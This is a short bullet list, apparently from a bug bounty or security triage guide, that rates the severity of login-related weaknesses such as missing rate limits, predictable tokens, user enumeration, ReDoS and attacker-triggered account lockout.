- No login rate limit + working credential-stuffing/IP-bypass: **High**
- Predictable security token (measured low entropy): **High**
- Username/email enumeration alone: **Low–Medium**
- ReDoS with reproducible meaningful server lag: **Medium–High**
- Attacker-triggerable hard lockout (account DoS): **Medium**
